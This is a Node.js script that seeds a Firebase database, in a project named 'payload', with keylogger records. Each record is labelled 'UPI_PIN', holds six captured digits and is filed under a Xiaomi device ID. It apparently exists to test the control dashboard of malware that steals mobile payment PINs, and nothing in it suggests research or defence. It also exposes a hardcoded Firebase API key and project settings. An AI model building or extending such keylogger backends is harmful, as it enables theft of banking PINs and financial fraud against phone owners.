// Simple script to add KeyLogs data to Firebase
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Add keylogs data for the actual device IDs
async function addKeyLogs() {
  try {
    console.log('Adding KeyLogs data...');
    
    // Add data for Xiaomi 23076PC4BI
    await set(ref(database, 'KeyLogs/Xiaomi 23076PC4BI/log1'), {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:09:00",
      Column1: "1", Column2: "2", Column3: "3", 
      Column4: "4", Column5: "5", Column6: "6"
    });
    console.log('Added log1 for Xiaomi 23076PC4BI');
    
    await set(ref(database, 'KeyLogs/Xiaomi 23076PC4BI/log2'), {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:08:00",
      Column1: "7", Column2: "8", Column3: "9", 
      Column4: "0", Column5: "1", Column6: "2"
    });
    console.log('Added log2 for Xiaomi 23076PC4BI');
    
    // Add data for Xiaomi M2103K19PI
    await set(ref(database, 'KeyLogs/Xiaomi M2103K19PI/log1'), {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:07:00",
      Column1: "3", Column2: "4", Column3: "5",
      Column4: "6", Column5: "7", Column6: "8"
    });
    console.log('Added log1 for Xiaomi M2103K19PI');
    
    console.log('✅ KeyLogs data added successfully!');
    console.log('Now check your app - it should show keylogs for Xiaomi 23076PC4BI');
    
    // Force exit after completion
    process.exit(0);
    
  } catch (error) {
    console.error('❌ Error adding data:', error);
    process.exit(1);
  }
}

// Run it with timeout
setTimeout(() => {
  console.log('⏰ Script timeout - forcing exit');
  process.exit(0);
}, 10000); // 10 second timeout

addKeyLogs();
